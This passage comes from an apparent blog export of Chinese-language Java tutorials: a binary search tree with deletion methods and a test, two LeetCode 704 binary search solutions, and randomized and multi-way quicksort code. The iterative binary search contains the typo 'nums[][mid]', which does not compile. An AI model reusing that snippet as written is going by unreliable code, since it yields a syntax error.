class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"BST is empty!"</span>);</span><br><span class="line">        <span class="keyword">return</span> minimum(root).e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回以node为根的二分搜索树的最小键值所在的节点</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">minimum</span><span class="params">(Node node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node.left == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        <span class="keyword">return</span> minimum(node.left);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 寻找二分搜索树的最大元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">maximum</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"BST is empty!"</span>);</span><br><span class="line">        <span class="keyword">return</span> maximum(root).e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回以node为根的二分搜索树的最大键值所在的节点</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">maximum</span><span class="params">(Node node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node.right == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        <span class="keyword">return</span> maximum(node.right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从二分搜索树中删除最小值所在的节点，返回最小值</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeMin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        E ret = minimum();</span><br><span class="line">        root = removeMin(root);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除掉以node为根的二分搜索树中的最小节点</span></span><br><span class="line">    <span class="comment">// 返回删除节点后新的二分搜索树的根</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">removeMin</span><span class="params">(Node node)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node.left == <span class="keyword">null</span>) &#123;</span><br><span class="line">            Node rightNode = node.right;</span><br><span class="line">            node.right = <span class="keyword">null</span>;</span><br><span class="line">            size --;</span><br><span class="line">            <span class="keyword">return</span> rightNode;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        node.left = removeMin(node.left);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从二分搜索树中删除最大值所在的节点，返回最大值</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeMax</span><span class="params">()</span></span>&#123;</span><br><span class="line">        E ret = maximum();</span><br><span class="line">        root = removeMax(root);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除掉以node为根的二分搜索树中的最大节点</span></span><br><span class="line">    <span class="comment">// 返回删除节点后新的二分搜索树的根</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">removeMax</span><span class="params">(Node node)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node.right == <span class="keyword">null</span>) &#123;</span><br><span class="line">            Node leftNode = node.left;</span><br><span class="line">            node.left = <span class="keyword">null</span>;</span><br><span class="line">            size --;</span><br><span class="line">            <span class="keyword">return</span> leftNode;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        node.right = removeMax(node.right);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从二分搜索树中删除元素为e 的节点</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        root = remove(root , e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除以node为根的二分搜索树中值为e的节点，递归算法</span></span><br><span class="line">    <span class="comment">// 返回删除节点后新的二分搜索树的根</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">remove</span><span class="params">(Node node, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(e.compareTo(node.e) &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            node.left = remove(node.left, e);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(e.compareTo(node.e) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            node.right = remove(node.right, e);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123; <span class="comment">// e == node.e</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(node.left == <span class="keyword">null</span>)&#123;</span><br><span class="line">                Node rightNode = node.right;</span><br><span class="line">                node.right = <span class="keyword">null</span>;</span><br><span class="line">                size --;</span><br><span class="line">                <span class="keyword">return</span> rightNode;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(node.right == <span class="keyword">null</span>)&#123;</span><br><span class="line">                Node leftNode = node.left;</span><br><span class="line">                node.left = <span class="keyword">null</span>;</span><br><span class="line">                size --;</span><br><span class="line">                <span class="keyword">return</span> leftNode;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 待删除节点左右子树均不为空的情况</span></span><br><span class="line">            <span class="comment">// 找到比待删除节点大的最小节点，即删除节点右子树的最小节点</span></span><br><span class="line">            <span class="comment">// 用这个节点顶替待删除节点的位置</span></span><br><span class="line">            Node successor = minimum(node.right);</span><br><span class="line">            successor.right = removeMin(node.right);</span><br><span class="line">            successor.left = node.left;</span><br><span class="line"></span><br><span class="line">            node.left = node.right = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> successor;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Main-java-测试用例"><a href="#Main-java-测试用例" class="headerlink" title="Main.java(测试用例)"></a>Main.java(测试用例)</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        BST&lt;Integer&gt; bst = <span class="keyword">new</span> BST&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">1000</span>;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i ++)</span><br><span class="line">            bst.add(random.nextInt(<span class="number">10000</span>));</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Integer&gt; nums = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span>(!bst.isEmpty())</span><br><span class="line">            nums.add(bst.removeMax());</span><br><span class="line"></span><br><span class="line">        System.out.println(nums);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span> ; i &lt; nums.size() ; i ++)</span><br><span class="line">            <span class="keyword">if</span>(nums.get(i-<span class="number">1</span>) &lt; nums.get(i))</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Error"</span>);</span><br><span class="line">            System.out.println(<span class="string">"RemoveMax test completed"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        bst.preOrder();</span></span><br><span class="line"><span class="comment">//        System.out.println();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        bst.preOrderNR();</span></span><br><span class="line"><span class="comment">//        bst.levelOrder();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        bst.inOrder();</span></span><br><span class="line"><span class="comment">//        System.out.println();</span></span><br><span class="line"><span class="comment">//        bst.postOrder();</span></span><br><span class="line"><span class="comment">//        System.out.println();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        System.out.println(bst);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>二分搜索树</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】LeetCode题答-704二分查找</title>
    <url>/2021/06/30/%E3%80%90Java%E3%80%91LeetCode%E9%A2%98%E7%AD%94-704%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="LeetCood题目"><a href="#LeetCood题目" class="headerlink" title="LeetCood题目"></a>LeetCood题目</h1><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210630045728618.png" alt="image-20210630045728618"></h2><h1 id="题答1（递归解法完整代码）"><a href="#题答1（递归解法完整代码）" class="headerlink" title="题答1（递归解法完整代码）"></a>题答1（递归解法完整代码）</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//704</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> search(nums ,<span class="number">0</span>, nums.length-<span class="number">1</span>, target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] data, <span class="keyword">int</span> l , <span class="keyword">int</span> r, <span class="keyword">int</span> target)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(l &gt; r) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(data[mid] == target)</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">if</span>(data[mid] &lt; target )</span><br><span class="line">            <span class="keyword">return</span> search(data, mid + <span class="number">1</span>, r, target);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> search(data, l, mid - <span class="number">1</span> , target);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="题答2（非递归解法完整代码）"><a href="#题答2（非递归解法完整代码）" class="headerlink" title="题答2（非递归解法完整代码）"></a>题答2（非递归解法完整代码）</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//704</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = nums.length - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在data[l, r ]范围中查找 target</span></span><br><span class="line">        <span class="keyword">while</span>(l &lt;= r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = l + (r - l ) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[][mid] == target)</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target)</span><br><span class="line">                l = mid + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                r = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="测试截图"><a href="#测试截图" class="headerlink" title="测试截图"></a>测试截图</h1><h2 id="题答1"><a href="#题答1" class="headerlink" title="题答1"></a>题答1</h2><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210630045847788.png" alt="image-20210630045847788"></p>
<h2 id="题答2"><a href="#题答2" class="headerlink" title="题答2"></a>题答2</h2><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210630051214790.png" alt="image-20210630051214790"></p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-快速排序（完整代码）</title>
    <url>/2021/06/30/%E3%80%90Java%E3%80%91%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F%EF%BC%88%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="快速排序执行耗时结果截图"><a href="#快速排序执行耗时结果截图" class="headerlink" title="快速排序执行耗时结果截图"></a>快速排序执行耗时结果截图</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210630045234675.png" alt="image-20210630045234675"></p>
<h1 id="快速排序执行（完整代码）"><a href="#快速排序执行（完整代码）" class="headerlink" title="快速排序执行（完整代码）"></a>快速排序执行（完整代码）</h1><h2 id="QuickSort-java（进行了三层优化之后的算法时间进行比较）"><a href="#QuickSort-java（进行了三层优化之后的算法时间进行比较）" class="headerlink" title="QuickSort.java（进行了三层优化之后的算法时间进行比较）"></a>QuickSort.java（进行了三层优化之后的算法时间进行比较）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuickSort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">QuickSort</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] arr)</span></span>&#123;</span><br><span class="line">        Random rnd = <span class="keyword">new</span> Random();</span><br><span class="line">        sort(arr, <span class="number">0</span>, arr.length-<span class="number">1</span>, rnd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] arr, <span class="keyword">int</span> l , <span class="keyword">int</span> r, Random rnd)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> p = partition(arr, l , r, rnd);</span><br><span class="line">        sort(arr, l, p-<span class="number">1</span>, rnd);</span><br><span class="line">        sort(arr, p+<span class="number">1</span> , r, rnd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(E[] arr, <span class="keyword">int</span> l, <span class="keyword">int</span> r, Random rnd)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成[l,r]之间的随机索引</span></span><br><span class="line">        <span class="keyword">int</span> p = l + rnd.nextInt(r-l+<span class="number">1</span>);</span><br><span class="line">        swap(arr, l , p);</span><br><span class="line">        <span class="comment">// arr[l+1...j] &lt; v; arr[j+1...i] &gt;v</span></span><br><span class="line">        <span class="keyword">int</span> j=l;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = l + <span class="number">1</span>; i&lt;= r; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i].compareTo(arr[l]) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                j ++;</span><br><span class="line">                swap(arr, j, i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(arr, l,j);</span><br><span class="line">        <span class="keyword">return</span> j;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort2ways</span><span class="params">(E[] arr)</span></span>&#123;</span><br><span class="line">        Random rnd = <span class="keyword">new</span> Random();</span><br><span class="line">        sort2ways(arr, <span class="number">0</span>, arr.length-<span class="number">1</span>, rnd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort2ways</span><span class="params">(E[] arr, <span class="keyword">int</span> l , <span class="keyword">int</span> r, Random rnd)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> p = partition2(arr, l , r, rnd);</span><br><span class="line">        sort2ways(arr, l, p-<span class="number">1</span>, rnd);</span><br><span class="line">        sort2ways(arr, p+<span class="number">1</span> , r, rnd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">int</span> <span class="title">partition2</span><span class="params">(E[] arr, <span class="keyword">int</span> l, <span class="keyword">int</span> r, Random rnd)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成[l,r]之间的随机索引</span></span><br><span class="line">        <span class="keyword">int</span> p = l + rnd.nextInt(r-l+<span class="number">1</span>);</span><br><span class="line">        swap(arr, l , p);</span><br><span class="line">        <span class="comment">// arr[l+1...j] &lt; v; arr[j+1...i] &gt;v</span></span><br><span class="line"><span class="comment">//        int j=l;</span></span><br><span class="line"><span class="comment">//        for(int i = l + 1; i&lt;= r; i++)&#123;</span></span><br><span class="line"><span class="comment">//            if(arr[i].compareTo(arr[l]) &lt; 0)&#123;</span></span><br><span class="line"><span class="comment">//                j ++;</span></span><br><span class="line"><span class="comment">//                swap(arr, j, i);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        swap(arr, l,j);</span></span><br><span class="line"><span class="comment">//        return j;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// arr[l+1...i-1] &lt;= v; arr[j+1...r] &gt;= v</span></span><br><span class="line">        <span class="keyword">int</span> i = l+<span class="number">1</span> , j = r;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(i &lt;= j &amp;&amp; arr[i].compareTo(arr[l]) &lt; <span class="number">0</span>)</span><br><span class="line">                i ++;</span><br><span class="line">            <span class="keyword">while</span>(j &gt;= i &amp;&amp; arr[j].compareTo(arr[l]) &gt; <span class="number">0</span>)</span><br><span class="line">                j --;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(i &gt;= j) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            swap(arr, i , j);</span><br><span class="line">            i ++;</span><br><span class="line">            j --;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(arr, l , j);</span><br><span class="line">        <span class="keyword">return</span> j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort3ways</span><span class="params">(E[] arr)</span></span>&#123;</span><br><span class="line">        Random rnd = <span class="keyword">new</span> Random();</span><br><span class="line">        sort3ways(arr, <span class="number">0</span>, arr.length-<span class="number">1</span>, rnd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort3ways</span><span class="params">(E[] arr, <span class="keyword">int</span> l , <span class="keyword">int</span> r, Random rnd)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成[l,r]之间的随机索引</span></span><br><span class="line">        <span class="keyword">int</span> p = l + rnd.nextInt(r-l+<span class="number">1</span>);</span><br><span class="line">        swap(arr, l , p);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// arr[l + 1, lt] &lt; v, arr[lt + 1, i - 1] == v , arr[gt, r] &gt; v</span></span><br><span class="line">        <span class="keyword">int</span> lt = l , i = l + <span class="number">1</span>, gt = r + <span class="number">1</span>; <span class="comment">//初始空区间</span></span><br><span class="line">        <span class="keyword">while</span>(i &lt; gt)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(arr[i].compareTo(arr[l])&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                lt ++;</span><br><span class="line">                swap(arr, i , lt );</span><br><span class="line">                i ++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(arr[i].compareTo(arr[l])&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                gt --;</span><br><span class="line">                swap(arr, i, gt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123; <span class="comment">// arr[i] == arr[l]</span></span><br><span class="line">                i ++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(arr,l ,lt);</span><br><span class="line">        <span class="comment">// arr[l, lt - 1 ] &lt; v, arr[lt , gt - 1] == v, arr[gt, r ] &gt; v</span></span><br><span class="line">        sort3ways(arr, l , lt-<span class="number">1</span>, rnd);</span><br><span class="line">        sort3ways(arr, gt , r, rnd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E&gt; <span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(E[] arr, <span class="keyword">int</span> i , <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        E t = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">10000000</span>;</span><br><span class="line">        Integer[] arr = ArrayGenerator.generateRandomArray(n,n);</span><br><span class="line">        Integer[] arr2 = Arrays.copyOf(arr, arr.length);</span><br><span class="line"></span><br><span class="line">        SortingHelper.sortTest(<span class="string">"QuickSort"</span>, arr);</span><br><span class="line">        SortingHelper.sortTest(<span class="string">"QuickSort2"</span>, arr2);</span><br><span class="line"></span><br><span class="line">        arr = ArrayGenerator.generateOrderedArray(n);</span><br><span class="line">        arr2 = Arrays.copyOf(arr, arr.length);</span><br><span class="line"></span><br><span class="line">        SortingHelper.sortTest(<span class="string">"QuickSort"</span>, arr);</span><br><span class="line">        SortingHelper.sortTest(<span class="string">"QuickSort2"</span>, arr2);</span><br><span class="line"></span><br><span class="line">        arr = ArrayGenerator.generateRandomArray(n, <span class="number">1</span>);</span><br><span class="line">        arr2 = Arrays.copyOf(arr, arr.length);</span><br><span class="line">        Integer[] arr3 = Arrays.copyOf(arr, arr.length);</span><br><span class="line">        SortingHelper.sortTest(<span class="string">"QuickSort2"</span>, arr2);</span><br><span class="line">        SortingHelper.sortTest(<span class="string">"QuickSort3"</span>, arr3);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="ArrayGenerator-java-生成随机n个元素的数组"><a href="#ArrayGenerator-java-生成随机n个元素的数组" class="headerlink" title="ArrayGenerator.java(生成随机n个元素的数组)"></a>ArrayGenerator.java(生成随机n个元素的数组)</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayGenerator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">ArrayGenerator</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer[] generateOrderedArray(<span class="keyword">int</span> n)&#123;</span><br><span class="line"></span><br><span class="line">       Integer[] arr = <span class="keyword">new</span> Integer[n];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n ; i++)</span><br><span class="line">           arr[i] = i;</span><br><span class="line">       <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成一个长度为 n 的随机数组， 每个数字的范围是[ 0 , bound)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer[] generateRandomArray(<span class="keyword">int</span> n, <span class="keyword">int</span> bound)&#123;</span><br><span class="line"></span><br><span class="line">        Integer[] arr = <span class="keyword">new</span> Integer[n];</span><br><span class="line">        Random rnd = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n; i++)</span><br><span class="line">            arr[i] = rnd.nextInt(bound); <span class="comment">//从0到bound前闭后开</span></span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

